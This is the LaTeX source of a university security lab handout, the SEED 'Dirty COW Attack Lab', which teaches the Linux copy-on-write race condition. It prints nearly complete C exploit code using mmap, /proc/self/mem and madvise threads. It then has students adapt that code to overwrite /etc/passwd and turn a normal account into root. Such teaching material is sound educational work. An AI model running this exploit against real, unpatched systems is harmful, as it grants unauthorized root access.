%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Copyright by Wenliang Du.                                       %%
%%  This work is licensed under the Creative Commons                %%
%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
%%  To view a copy of this license, visit                           %%
%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\commonfolder}{../../common-files}

\documentclass[11pt]{article}

\usepackage[most]{tcolorbox}
\usepackage{times}
\usepackage{epsf}
\usepackage{epsfig}
\usepackage{amsmath, alltt, amssymb, xspace}
\usepackage{wrapfig}
\usepackage{fancyhdr}
\usepackage{url}
\usepackage{verbatim}
\usepackage{fancyvrb}
\usepackage{adjustbox}
\usepackage{listings}
\usepackage{color}
\usepackage{subfigure}
\usepackage{cite}
\usepackage{sidecap}
\usepackage{pifont}
\usepackage{mdframed}
\usepackage{textcomp}
\usepackage{enumitem}


% Horizontal alignment
\topmargin      -0.50in  % distance to headers
\oddsidemargin  0.0in
\evensidemargin 0.0in
\textwidth      6.5in
\textheight     8.9in 

\newcommand{\todo}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{TODO: #1}}
\vspace{0.1in}
}


\newcommand{\unix}{{\tt Unix}\xspace}
\newcommand{\linux}{{\tt Linux}\xspace}
\newcommand{\minix}{{\tt Minix}\xspace}
\newcommand{\ubuntu}{{\tt Ubuntu}\xspace}
\newcommand{\setuid}{{\tt Set-UID}\xspace}
\newcommand{\openssl} {\texttt{openssl}}


\pagestyle{fancy}
\lhead{\bfseries SEED Labs}
\chead{}
\rhead{\small \thepage}
\lfoot{}
\cfoot{}
\rfoot{}


\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}
\definecolor{lightgray}{gray}{0.90}


\lstset{%
  frame=none,
  language=,
  backgroundcolor=\color{lightgray},
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
%  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true,
  tabsize=3,
  columns=fullflexible,
  keepspaces=true,
  escapeinside={(*@}{@*)}
}

\newcommand{\newnote}[1]{
\vspace{0.1in}
\noindent
\fbox{\parbox{1.0\textwidth}{\textbf{Note:} #1}}
%\vspace{0.1in}
}


%% Submission
\newcommand{\seedsubmission}{You need to submit a detailed lab report, with screenshots,
to describe what you have done and what you have observed.
You also need to provide explanation
to the observations that are interesting or surprising.
Please also list the important code snippets followed by
explanation. Simply attaching code without any explanation will not
receive credits.}

%% Book
\newcommand{\seedbook}{\textit{Computer \& Internet Security: A Hands-on Approach}, 2nd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.}

%% Videos
\newcommand{\seedisvideo}{\textit{Internet Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.}

\newcommand{\seedcsvideo}{\textit{Computer Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.}

%% Lab Environment
\newcommand{\seedenvironment}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentA}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentB}{This lab has been tested on our pre-built
Ubuntu 20.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentAB}{This lab has been tested on our pre-built
Ubuntu 16.04 and 20.04 VMs, which can be downloaded from the SEED website. }

\newcommand{\nodependency}{Since we use containers to set up the lab environment, 
this lab does not depend too much on our SEED VM. You can do this lab
using other VMs or physical machines. }







\newcommand{\seedlabcopyright}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small Copyright \copyright\ {#1}\ \ by Wenliang Du.\\
      This work is licensed under a Creative Commons
      Attribution-NonCommercial-ShareAlike 4.0 International License.
      If you remix, transform, or build upon the material, 
      this copyright notice must be left intact, or reproduced in a way that is reasonable to
      the medium in which the work is being re-published.}}
\vspace{0.1in}
}






\newcommand{\cowFigs}{./Figs}

\lhead{\bfseries SEED Labs -- Dirty COW Attack Lab}


\begin{document}

\begin{center}
{\LARGE Dirty COW Attack Lab}
\end{center}

\seedlabcopyright{2017}



% *******************************************
% SECTION
% ******************************************* 
\section{Overview}

The Dirty COW vulnerability is an interesting case of
the race condition vulnerability. It existed in the \linux kernel since
September 2007, and was discovered and exploited in October 2016.
The vulnerability affects all \linux-based operating systems, including
Android, and its consequence is very severe: attackers can gain the root
privilege by exploiting the vulnerability. The vulnerability resides
in the code of copy-on-write inside \linux kernel. By exploiting this vulnerability, attackers
can modify any protected file, even though these files are only readable to them.

The objective of this lab is for students to gain the hands-on experience on the Dirty COW
attack, understand the race condition vulnerability exploited by the attack, and 
gain a deeper understanding of the general race condition security problems. In this lab,
students will exploit the Dirty COW race condition vulnerability to gain the root privilege.  


\paragraph{Readings and videos.}
Detailed coverage of the Dirty COW attack can be found in the following:

\begin{itemize}
\item Chapter 8 of the SEED Book, \seedbook
\item Section 7 of the SEED Lecture at Udemy, \seedcsvideo
\end{itemize}


\paragraph{Lab environment.} This lab has been tested on our pre-built
Ubuntu 12.04 VM, which can be downloaded from the SEED website.
If you are using our SEEDUbuntu 16.04 VM, this attack will not work, because the 
vulnerability has already been patched in the kernel. 
You can download the SEEDUbuntu12.04 VM from the SEED web
site. If you have an Amazon EC2 account, you can find our VM from 
the ``Community AMIs''. The name of the VM is 
\texttt{SEEDUbuntu12.04-Generic}. It should be noted that
Amazon's site says that this is a 64-bit VM; that is incorrect. The VM is
32-bit. However, this incorrect information does not cause any problem.




% *******************************************
\section{Task 1: Modify a Dummy Read-Only File}

The objective of this task is to write to a read-only file using the Dirty
COW vulnerability. 


\subsection{Create a Dummy File}

We first need to select a target file. Although this file can be any read-only
file in the system, we will use a dummy file in this task, so we do not corrupt 
an important system file in
case we make a mistake. Please create a file called \texttt{zzz} 
in the root directory, change its permission to read-only for normal users,
and put some random content into the file using an editor such as \texttt{gedit}. 

\begin{lstlisting}
$ sudo touch /zzz
$ sudo chmod 644 /zzz
$ sudo gedit /zzz
$ cat /zzz
111111222222333333
$ ls -l /zzz
-rw-r--r-- 1 root root 19 Oct 18 22:03 /zzz
$ echo 99999 > /zzz
bash: /zzz: (*@\texttt{Permission denied}@*)
\end{lstlisting}
 
From the above experiment, we can see that if we try to write to this file as a 
normal user, we will fail, because the file is only readable to normal users. 
However, because of the Dirty COW vulnerability in the system, we can
find a way to write to this file. Our objective is to replace the pattern
\texttt{"222222"} with \texttt{"******"}. 



\subsection{Set Up the Memory Mapping Thread}


You can download the program \texttt{cow\_attack.c} from the
website of the lab. The program has three threads: the main thread, the write thread,
and the madvise thread. 
The main thread maps \texttt{/zzz} to memory, finds where the pattern
\texttt{"222222"} is, and then creates two threads to exploit the 
Dirty COW race condition vulnerability in the OS kernel. 

\begin{lstlisting}[caption={The main thread},
                   label=cow:code:cow_attack:main]
/* cow_attack.c  (the main thread) */

#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>

void *map;

int main(int argc, char *argv[])
{
  pthread_t pth1,pth2;
  struct stat st;
  int file_size;

  // Open the target file in the read-only mode.
  int f=open("/zzz", O_RDONLY);

  // Map the file to COW memory using MAP_PRIVATE.
  fstat(f, &st);
  file_size = st.st_size;
  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

  // Find the position of the target area
  char *position = strstr(map, "222222");                         (*@\ding{192}@*)

  // We have to do the attack using two threads.
  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); (*@\ding{193}@*)
  pthread_create(&pth2, NULL, writeThread, position);             (*@\ding{194}@*)

  // Wait for the threads to finish.
  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}

\end{lstlisting}


In the above code, we need to find where the pattern \texttt{"222222"}is. We
use a string function called \texttt{strstr()} to find where \texttt{"222222"}
is in the mapped memory~(Line~\ding{192}). We then start two threads:
\texttt{madviseThread}~(Line~\ding{193}) and
\texttt{writeThread}~(Line~\ding{194}).



% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Set Up the \texttt{write} Thread}

The job of the \texttt{write} thread listed in the following
is to replace the string \texttt{"222222"} in the
memory with \texttt{"******"}. Since the mapped memory is of COW type,
this thread alone will only be able to modify the contents in a copy of the mapped memory, which
will not cause any change to the underlying \texttt{/zzz} file.


\begin{lstlisting}[caption={The \texttt{write} thread},
                   label=cow:code:cow_attack:write]
/* cow_attack.c (the write thread) */

void *writeThread(void *arg)
{
  char *content= "******";
  off_t offset = (off_t) arg;

  int f=open("/proc/self/mem", O_RDWR);
  while(1) {
    // Move the file pointer to the corresponding position.
    lseek(f, offset, SEEK_SET);
    // Write to the memory.
    write(f, content, strlen(content));
  }
}
\end{lstlisting}


\subsection{The \texttt{madvise} Thread}

The \texttt{madvise} thread does only one thing: discarding the private copy of
the mapped memory, so the page table can point back to the original mapped
memory.


\begin{lstlisting}[caption={The \texttt{madvise} thread},
                   label=cow:code:cow_attack:madvise]
/* cow_attack.c (the madvise thread) */

void *madviseThread(void *arg)
{
  int file_size = (int) arg;
  while(1){
      madvise(map, file_size, MADV_DONTNEED);
  }
}
\end{lstlisting}


\subsection{Launch the Attack}

If the \texttt{write()} and the \texttt{madvise()} system calls are invoked alternatively,
i.e., one is invoked only after the other is finished, the \texttt{write}
operation will always be performed on the private copy, and we will never be able to modify the
target file.  The only way for the attack to succeed is to perform the \texttt{madvise()}
system call while the \texttt{write()} system call is still running. We cannot always achieve
that, so we need to try many times. As long as the probability is not extremely low,
we have a chance. That is why in the threads, we run the two system calls in an infinite loop.
Compile the \texttt{cow\_attack.c}  and run it for a few seconds. If
your attack is successful, you should be able to see a modified \texttt{/zzz} file.
Report your results in the lab report and explain how you are able to
achieve that. 


\begin{lstlisting}
$ gcc cow_attack.c -lpthread
$ a.out
  ... press Ctrl-C after a few seconds ...
\end{lstlisting}



\section{Task 2: Modify the Password File to Gain the Root Privilege} 

Now, let's launch the attack on a real system file, so we can gain the root privilege.
We choose the \texttt{/etc/passwd} file as our target file. This file
is world-readable, but non-root users cannot modify it. The file contains
the user account information, one record for each user.  Assume that our user name is
\texttt{seed} . The following lines show the records for root and \texttt{seed}:

\begin{lstlisting}
root:x:0:0:root:/root:/bin/bash
seed:x:1000:1000:Seed,123,,:/home/seed:/bin/bash
\end{lstlisting}

Each of the above record contains seven colon-separated fields. Our interest is on the third
field, which specifies the user ID~(UID) value assigned to a user. UID is the primary
basis for access control in \linux, so this value is critical to security.
The root user's UID field contains a special value 0; that is what makes it the superuser,
not its name. Any user with UID \texttt{0} is treated by the system as root,
regardless of what user name he or she has.
The \texttt{seed} user's ID is only \texttt{1000}, so
it does not have the root privilege. However, if we can change the value to
\texttt{0}, we can turn it
into root. We will exploit the Dirty COW vulnerability to achieve this goal.

In our experiment, we will not use the \texttt{seed} account, because this account is used
for most of the experiments in this book; if we forget to change the UID back after the
experiment, other experiments will be affected.  Instead, we create a new account called
\texttt{charlie}, and we will turn this normal user into root using
the Dirty COW attack.
Adding a new account can be achieved using the \texttt{adduser} command.
After the account is created, a new
record will be added to \texttt{/etc/passwd}.  See
the following:

\begin{lstlisting}
$ sudo adduser charlie
  ...
$ cat /etc/passwd | grep charlie
charlie:x:1001:1001:,,,:/home/charlie:/bin/bash
\end{lstlisting}

We suggest that you save a copy of the \texttt{/etc/passwd} file, just in case you 
make a mistake and corrupt this file. An alternative is to take a snapshot of your VM before
working on this lab, so you can always roll back if the VM got corrupted. 



\paragraph{Task:} You need to modify the \texttt{charlie}'s entry in
\texttt{/etc/passwd}, so the third field is changed from \texttt{1001} to 
\texttt{0000}, essentially turning \texttt{charlie} into a root account. 
The file is not writable to \texttt{charlie}, but we can use 
the Dirty COW attack to write to this file. You can  
modify the \texttt{cow\_attack.c} program from Task 1 to achieve 
this goal. 

After your attack is successful, if you switch user to \texttt{charlie}, you should be able to see the 
\texttt{\#} sign at the shell prompt, which is an indicator of the root shell. If you 
run the \texttt{id} command, you should be able to see that you have gained the root privilege. 

\begin{lstlisting}
seed@ubuntu$ su charlie
Passwd: 
root@ubuntu# id
(*@\textbf{uid=0(root)}@*) gid=1001(charlie) groups=0(root),1001(charlie)
\end{lstlisting}
 


% *******************************************
% SECTION
% ******************************************* 
\section{Submission}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

You need to submit a detailed lab report, with screenshots,
to describe what you have done and what you have observed.
You also need to provide explanation
to the observations that are interesting or surprising.
Please also list the important code snippets followed by
explanation. Simply attaching code without any explanation will not
receive credits.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%



\end{document}
